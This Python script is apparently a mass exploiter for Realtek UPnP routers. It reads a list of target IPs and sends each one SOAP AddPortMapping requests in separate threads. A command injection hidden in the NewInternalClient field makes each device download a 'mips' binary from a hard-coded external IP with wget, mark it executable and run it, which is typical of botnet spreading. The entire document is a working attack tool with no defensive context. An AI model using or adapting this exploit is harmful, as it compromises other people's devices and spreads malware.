import threading, sys, time, random, socket, re, os, struct, array, requests

list = open(sys.argv[1], "r").readlines()

host = "67.205.139.228" # IP to where your bins are hosted
bins = "mips" # name of mips binary

payload1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:AddPortMapping xmlns:u=\"urn:schemas-upnp-org:service:WANIPConnection:1\"><NewRemoteHost></NewRemoteHost><NewExternalPort>47450</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`cd /tmp/;wget http://"+host+"/"+bins+"`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>"
payload2 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:AddPortMapping xmlns:u=\"urn:schemas-upnp-org:service:WANIPConnection:1\"><NewRemoteHost></NewRemoteHost><NewExternalPort>47451</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`cd /tmp/;chmod +x "+bins+";./"+bins+"`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>"
headerlist = {'SOAPAction': 'urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping'}

class hackershit(threading.Thread):
		def __init__ (self, ip):
			threading.Thread.__init__(self)
			self.ip = str(ip).rstrip('\n')
		def run(self):
			try:
				print "\x1b[1;35m[\x1b[1;36mRealtek UPnP Exploiter\x1b[1;35m] \x1b[1;35m[\x1b[1;36m"+bins+"\x1b[1;35m] [\x1b[1;36m"+self.ip+"\x1b[1;35m]\x1b[37m"
				url = "http://" + self.ip + ":52869/picsdesc.xml"
				requests.post(url, timeout=3, headers=headerlist, data=payload1)
				requests.post(url, timeout=2.5, headers=headerlist, data=payload2)
			except Exception as e:
				pass
for ip in list:
	try:
		hax = hackershit(ip)
		hax.start()
	except:
		pass
